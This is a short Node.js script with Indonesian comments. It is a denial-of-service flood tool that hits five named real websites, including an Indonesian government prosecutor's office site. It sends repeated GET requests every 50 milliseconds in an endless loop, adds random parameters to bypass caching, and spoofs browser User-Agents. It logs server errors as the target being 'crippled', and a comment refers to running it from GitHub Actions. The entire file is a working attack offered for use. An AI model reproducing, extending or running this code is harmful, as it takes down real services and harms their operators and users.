const https = require('https');
const http = require('http');

// DAFTAR TARGET LU - Masukin semua link di sini!
const targets = [
    'https://kejari-pali.kejaksaan.go.id/',
    'https://api.nvidiabotz.xyz/',
    'https://tuntasonline.id/',
    'https://freepanel.alfa-lyneen.my.id/',
    'https://mediasriwijaya.com/'
];

// Konfigurasi Kekuatan
const threads = 10; // Jumlah request per putaran untuk tiap target

function strike(url) {
    const isHttps = url.startsWith('https');
    const client = isHttps ? https : http;
    
    // Bypass Cache dengan random string
    const finalUrl = url + (url.includes('?') ? '&' : '?') + 'noctera=' + Math.random().toString(36).substring(7);

    const options = {
        method: 'GET',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + (Math.floor(Math.random() * 20) + 100) + '.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
    };

    const req = client.request(finalUrl, options, (res) => {
        // Pantau hasil di log GitHub Actions
        if (res.statusCode >= 500) {
            console.log(`[ 💀 ] CRITICAL! | ${url} | Status: ${res.statusCode} (Target Lumpuh)`);
        } else {
            console.log(`[ 🌀 ] STRIKE! | ${url} | Status: ${res.statusCode}`);
        }
    });

    req.on('error', (e) => {
        console.log(`[ ⚠️ ] CONNECTION REFUSED: ${url} | ${e.message}`);
    });

    req.end();
}

// Loop Abadi
console.log("🚀 ETERNAL MACHINE ACTIVE: Menghantam " + targets.length + " target sekaligus...");
setInterval(() => {
    targets.forEach(target => {
        for (let i = 0; i < threads; i++) {
            strike(target);
        }
    });
}, 50); // Kecepatan per 50 milidetik
